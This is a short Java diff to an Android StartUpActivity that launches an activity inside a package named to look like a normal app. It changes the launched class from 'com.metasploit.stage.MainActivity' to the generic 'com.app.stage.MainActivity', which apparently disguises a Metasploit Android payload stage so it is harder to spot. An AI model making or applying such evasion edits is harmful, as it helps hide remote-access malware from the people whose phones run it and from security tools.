@@ -15,7 +15,7 @@ public class StartUpActivity extends Activity {
         super.onCreate(savedInstanceState);
 
         Intent intent = new Intent();
-        intent.setComponent(new ComponentName("com.package.ofnormall.app", "com.metasploit.stage.MainActivity"));
+        intent.setComponent(new ComponentName("com.package.ofnormall.app", "com.app.stage.MainActivity"));
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
 
